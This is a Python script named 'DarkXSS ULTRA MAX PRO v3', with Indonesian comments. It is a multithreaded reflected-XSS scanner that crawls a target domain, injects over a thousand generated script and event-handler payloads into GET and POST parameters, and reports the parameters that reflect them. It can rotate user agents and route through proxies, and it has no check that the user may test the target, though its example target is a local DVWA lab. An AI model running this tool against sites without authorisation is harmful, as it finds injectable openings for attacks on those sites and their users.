#!/usr/bin/env python3
import requests, urllib3, sys, json, re, threading, random, time, os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup
from queue import Queue

urllib3.disable_warnings()
R="\033[91m";G="\033[92m";C="\033[96m";Y="\033[93m";W="\033[0m"

# =============================================
# === USER SETTINGS
THREADS = 15
MAX_DEPTH = 2      # kedalaman crawler
USE_PROXY = False  # set True kalau mau pakai proxy
PROXY_LIST = ["http://127.0.0.1:8080"] # isi daftar proxy
payload_file = "payloads.txt"

# Random User-Agent list
UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile; rv:89.0)",
]

# =============================================
# === LOAD PAYLOADS
base_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "\"><svg/onload=confirm(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
]

# auto generate ribuan
events = ["onmouseover","onfocus","onblur","onmouseenter","onmouseleave",
          "onmouseup","onmousedown","onkeydown","onkeyup","onerror","onload"]
tags = ["img","svg","iframe","div","section","math","embed","object","details","marquee","input"]
extra = []
for ev in events:
    for tag in tags:
        extra.append(f"<{tag} src=x {ev}=alert(1)>")
for i in range(500):
    extra.append(f"<script>alert({i})</script>")
    extra.append(f"\"><img src=x onerror=alert({i})>")

payloads = list(dict.fromkeys(base_payloads+extra))

# tambahkan payload eksternal
if os.path.exists(payload_file):
    with open(payload_file,"r",encoding="utf-8") as f:
        lines = [x.strip() for x in f if x.strip()]
        payloads.extend(lines)
    payloads = list(dict.fromkeys(payloads))
print(f"{C}[i] Total payloads loaded: {len(payloads)}{W}")

# =============================================
# === GLOBALS
found_lock = threading.Lock()
found_list = []

# =============================================
# === REPORT
def save_reports():
    with open("xss_report_v3.html","w",encoding="utf-8") as f:
        f.write("<html><head><title>XSS Report</title></head><body>")
        f.write("<h1>XSS Report by DARKNESS</h1><table border=1><tr><th>URL</th><th>Param</th><th>Payload</th></tr>")
        for entry in found_list:
            f.write(f"<tr><td>{entry['url']}</td><td>{entry['param']}</td><td>{entry['payload']}</td></tr>")
        f.write("</table></body></html>")
    with open("xss_report_v3.json","w",encoding="utf-8") as f:
        json.dump(found_list,f,indent=2)
    print(f"{G}[✔] Report HTML & JSON tersimpan{W}")

# =============================================
# === SCAN
def get_session():
    s = requests.Session()
    s.verify = False
    if USE_PROXY and PROXY_LIST:
        s.proxies = {"http": random.choice(PROXY_LIST), "https": random.choice(PROXY_LIST)}
    s.headers.update({"User-Agent": random.choice(UA_LIST)})
    return s

def scan_single(url, mode="GET", postdata=None):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    if not qs:
        return
    for param in qs.keys():
        for idx,p in enumerate(payloads):
            try:
                s = get_session()
                if mode=="GET":
                    new_qs = qs.copy()
                    new_qs[param] = p
                    new_query = urlencode(new_qs,doseq=True)
                    new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                    r = s.get(new_url,timeout=4)
                    if p in r.text:
                        with found_lock:
                            found_list.append({"url":new_url,"param":param,"payload":p})
                            print(f"{G}[★] XSS! {param} => {p}{W}")
                else:
                    data = postdata.copy() if postdata else {}
                    data[param] = p
                    r = s.post(url,data=data,timeout=4)
                    if p in r.text:
                        with found_lock:
                            found_list.append({"url":url,"param":param,"payload":p})
                            print(f"{G}[★] XSS! {param} => {p}{W}")
                if idx % 300 == 0 and idx>0:
                    progress = int((idx/len(payloads))*100)
                    print(f"{Y}[{progress}%] param {param}{W}")
            except:
                pass

# =============================================
# === MULTITHREAD
def worker(q, mode="GET", postdata=None):
    while not q.empty():
        url = q.get()
        scan_single(url, mode, postdata)
        q.task_done()

def run_multithread(urls, mode="GET", postdata=None):
    q = Queue()
    for u in urls:
        q.put(u)
    for _ in range(THREADS):
        t = threading.Thread(target=worker,args=(q,mode,postdata))
        t.daemon=True
        t.start()
    q.join()

# =============================================
# === CRAWLER
def crawl(start_url, depth=1, visited=None):
    if visited is None:
        visited=set()
    if depth>MAX_DEPTH:
        return []
    links=[]
    try:
        s = get_session()
        r = s.get(start_url,timeout=5)
        soup = BeautifulSoup(r.text,"html.parser")
        for a in soup.find_all('a', href=True):
            full = urljoin(start_url,a['href'])
            if full.startswith(start_url.split("/")[0]+"//"+start_url.split("/")[2]):
                if "?" in full and full not in visited:
                    links.append(full)
                    visited.add(full)
                    links.extend(crawl(full,depth+1,visited))
    except: pass
    return list(set(links))

# =============================================
# === MENU
print(f"""{C}
=== DarkXSS ULTRA MAX PRO v3 ===
1. Scan single URL (GET)
2. Scan single URL (POST)
3. Crawl domain & scan (GET)
{W}""")
choice = input(f"{C}[?] Pilih mode: {W}")

if choice=="1":
    target = input(f"{C}[?] URL lengkap dgn param: {W}")
    run_multithread([target],mode="GET")
elif choice=="2":
    target = input(f"{C}[?] URL target POST: {W}")
    raw = input(f"{C}[?] Data POST (contoh: name=test&id=1): {W}")
    data = dict(x.split('=') for x in raw.split('&'))
    run_multithread([target],mode="POST",postdata=data)
elif choice=="3":
    start = input(f"{C}[?] Domain start (contoh: http://127.0.0.1/DVWA): {W}")
    print(f"{Y}[~] Crawling... ini bisa lama kalau banyak link...{W}")
    links = crawl(start,depth=1)
    print(f"{C}[i] Total link ditemukan: {len(links)}{W}")
    run_multithread(links,mode="GET")
else:
    print(f"{R}[!] Pilihan tidak valid{W}")
    sys.exit()

if found_list:
    save_reports()
else:
    print(f"{Y}[~] Tidak ada XSS ditemukan{W}")

print(f"{C}=== Selesai ==={W}")